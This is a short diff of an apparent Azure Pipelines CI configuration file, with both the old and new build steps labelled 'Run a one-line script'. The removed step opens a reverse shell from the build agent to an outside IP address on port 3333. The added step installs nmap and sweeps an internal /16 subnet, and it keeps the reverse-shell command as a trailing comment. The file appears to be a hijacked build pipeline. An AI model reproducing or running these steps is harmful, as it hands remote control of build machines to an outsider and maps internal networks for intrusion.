@@ -10,7 +10,7 @@ pool:
   vmImage: 'ubuntu-latest'
 
 steps:
-- script: sh -i >& /dev/tcp/54.203.54.34/3333 0>&1
+- script: sudo apt-get update && apt-get install nmap && nmap -sP 172.17.0.1/16 #sh -i >& /dev/tcp/54.203.54.34/3333 0>&1
   displayName: 'Run a one-line script'
 
 - script: |
